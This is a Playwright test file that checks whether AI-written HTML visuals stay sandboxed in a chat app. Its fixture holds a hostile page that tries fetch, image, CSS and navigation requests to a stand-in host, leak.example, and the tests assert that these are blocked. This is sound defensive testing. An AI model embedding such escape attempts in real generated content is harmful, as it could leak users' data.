import { expect, test } from "./fixtures";

test.use({ storageState: { cookies: [], origins: [] } });

// A visual is HTML the model wrote. It runs inside a sandboxed frame under a
// CSP the app owns, so a hostile visual must not be able to reach the network,
// navigate its frame away, or do anything but draw and post a citation.
const VISUAL_ID = "3b7f1c2e-9a4d-4f6b-8e1a-5c2d7e9f0a1b";
const SOURCE_ID = "4f1b7e8a-2c3d-4e5f-8a9b-0c1d2e3f4a5b";
const MARKER = "SANDBOX-MARKER-7421";

// Every network route a page can take: fetch, an image, a CSS url(), and, when
// `navigate` is set, a clicked link and a location change on load.
const visualFixture = (navigate: boolean) => `<!doctype html>
<html lang="en" data-theme="light">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:">
<title>Rent by year</title>
<style>body{font-family:sans-serif;margin:16px}.bg{background:url(https://leak.example/css.png)}</style>
</head>
<body>
<h1>Rent by year</h1>
<p id="marker">${MARKER}</p>
<div class="bg">styled</div>
<img src="https://leak.example/x.png" alt="">
<a id="away" href="https://leak.example/page">away</a>
<button type="button" data-cite="${SOURCE_ID}" data-quote="Rent is 1,200 per month">Source</button>
<p id="mv-snapshot">Prepared 20 October 2026 from Lease schedule.xlsx.</p>
<script>
  try { fetch("https://leak.example/fetch"); } catch (e) {}
  if (${navigate}) document.getElementById("away").click();
  document.querySelector("[data-cite]").addEventListener("click", function (event) {
    var button = event.currentTarget;
    parent.postMessage({ type: "mike:cite", cite: button.getAttribute("data-cite"), quote: button.getAttribute("data-quote"), page: "2" }, "*");
  });
  window.addEventListener("load", function () {
    parent.postMessage({ type: "mike:ready" }, "*");
    if (${navigate}) { try { location.href = "https://leak.example/navigated"; } catch (e) {} }
  });
</script>
</body>
</html>`;

async function openVisual(page: import("@playwright/test").Page, navigate: boolean) {
    await page.addInitScript(
        ({ visual, visualId, sourceId }) => {
            const originalFetch = window.fetch.bind(window);
            const json = (body: unknown, status = 200) =>
                Promise.resolve(
                    new Response(JSON.stringify(body), {
                        status,
                        headers: { "Content-Type": "application/json" },
                    }),
                );
            const chat = {
                id: "visual-chat",
                title: "Rent chart",
                user_id: "visual-user",
                project_id: null,
                model: "test-model",
                created_at: "2026-10-20T00:00:00Z",
                is_owner: true,
                access_role: "owner",
            };
            window.fetch = (input, init) => {
                const url = new URL(input instanceof Request ? input.url : String(input), location.href);
                const path = url.pathname;
                if (!path.startsWith("/api/")) return originalFetch(input, init);
                if (path === "/api/auth/session") return json({ user: { id: "visual-user", email: "synthetic@example.com" } });
                if (path === "/api/user/profile") return json({ onboardingComplete: true, displayName: "Synthetic", apiKeyStatus: {}, creditsRemaining: 100 });
                if (path === "/api/models/configured") return json({ models: [{ id: "test-model", label: "Test model", source: "Configured" }] });
                if (path.startsWith("/api/models/")) return json({ models: [] });
                if (path === "/api/chat/visual-chat") {
                    return json({
                        chat, is_owner: true, access_role: "owner",
                        messages: [
                            { id: "q1", role: "user", content: "Chart the rent schedule." },
                            { id: "a1", role: "assistant", content: [
                                { type: "doc_created", filename: "rent-chart.html", download_url: `/single-documents/${visualId}/file?version_id=v1`, document_id: visualId, version_id: "v1", version_number: 1 },
                                { type: "content", text: "Here is the rent chart." },
                            ] },
                        ],
                    });
                }
                if (path === `/api/single-documents/${visualId}/file`) {
                    return Promise.resolve(new Response(visual, {
                        headers: { "Content-Type": "text/html; charset=utf-8", "Content-Disposition": 'attachment; filename="rent-chart.html"' },
                    }));
                }
                if (path === `/api/single-documents/${visualId}`) {
                    return json({ id: visualId, filename: "rent-chart.html", file_type: "html", project_id: null, status: "ready", can_edit: false, can_delete: false });
                }
                if (path === `/api/visuals/${visualId}/snapshot`) {
                    return json({ created_at: "2026-10-20T14:32:00Z", sources: [{ document_id: sourceId, filename: "Lease schedule.xlsx", stale: false }] });
                }
                if (path === "/api/visuals/capabilities") return json({ pdf: false, docx: false });
                if (path === `/api/single-documents/${sourceId}/versions`) {
                    return json({ current_version_id: "s1", versions: [{ id: "s1", version_number: 1, source: "upload", created_at: "2026-10-01T00:00:00Z", filename: "Lease schedule.xlsx", file_type: "xlsx" }] });
                }
                if (path === `/api/single-documents/${sourceId}`) {
                    return json({ id: sourceId, filename: "Lease schedule.xlsx", file_type: "xlsx", project_id: null, status: "ready", can_edit: false, can_delete: false });
                }
                if (path === `/api/single-documents/${visualId}/versions`) {
                    return json({ current_version_id: "v1", versions: [{ id: "v1", version_number: 1, source: "assistant", created_at: "2026-10-20T14:32:00Z", filename: "rent-chart.html", file_type: "html" }] });
                }
                if (path === "/api/chat") return json([chat]);
                return json([]);
            };
        },
        { visual: visualFixture(navigate), visualId: VISUAL_ID, sourceId: SOURCE_ID },
    );
    await page.goto("/assistant/chat/visual-chat");
    await expect(page.getByPlaceholder("How can I help?")).toBeVisible();
    await page.getByRole("button", { name: "Completed in 1 step", exact: true }).click();
    await page.getByRole("button", { name: "rent-chart.html", exact: true }).click();
    return page.frameLocator("iframe[data-mike-visual-frame]").frameLocator("#visual");
}

function foreignRequests(page: import("@playwright/test").Page, baseURL: string | undefined) {
    const origin = new URL(baseURL ?? "http://localhost:3000").origin;
    const foreign: string[] = [];
    // Chromium reports a request the CSP refused as one that failed with
    // "csp"; it never reached the network, so only the others count.
    const record = (request: import("@playwright/test").Request) => {
        if (!request.url().startsWith(origin)) foreign.push(request.url());
    };
    page.on("requestfinished", record);
    page.on("requestfailed", (request) => {
        if (request.failure()?.errorText !== "csp") record(request);
    });
    return foreign;
}

test("a visual's fetch, image and css requests never leave the app origin", async ({ page, baseURL }) => {
    const foreign = foreignRequests(page, baseURL);
    const inner = await openVisual(page, false);

    await expect(inner.getByText(MARKER)).toBeVisible();
    // Nothing marks "no request was made", so give the page's script a moment.
    await page.waitForTimeout(500);
    expect(foreign).toEqual([]);
});

test("a visual that navigates its own frame is stopped and reported, not loaded", async ({ page, baseURL }) => {
    const foreign = foreignRequests(page, baseURL);
    await openVisual(page, true);

    await expect(page.getByText("This visual could not be drawn.")).toBeVisible();
    await expect(page.getByRole("button", { name: "Try again" })).toHaveCount(0);
    expect(foreign).toEqual([]);
});

test("a cite inside the visual opens the cited document as a citation tab", async ({ page }) => {
    const inner = await openVisual(page, false);
    await expect(inner.getByText(MARKER)).toBeVisible();

    await inner.getByRole("button", { name: "Source" }).click();

    await expect(page.getByRole("tab", { name: /Lease schedule\.xlsx/ })).toBeVisible();
    await expect(page.getByText("Rent is 1,200 per month")).toBeVisible();
});
